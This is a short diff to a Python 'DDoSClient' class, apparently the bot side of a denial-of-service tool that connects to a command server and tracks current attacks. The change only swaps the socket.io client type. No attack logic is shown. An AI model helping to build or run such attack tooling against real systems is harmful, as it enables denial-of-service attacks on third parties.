@@ -20,7 +20,7 @@ class DDoSClient:
     def __init__(self, server_url='http://localhost:5000', client_name=None):
         self.server_url = server_url
         self.client_name = client_name or f"{platform.node()}_{platform.system()}"
-        self.sio = socketio.SimpleClient()
+        self.sio = socketio.client.Client() 
         self.current_attack = None
         self.attack_thread = None
         self.running = False
@@ -273,3 +273,4 @@ def main():
 if __name__ == "__main__":
 
     main()
+
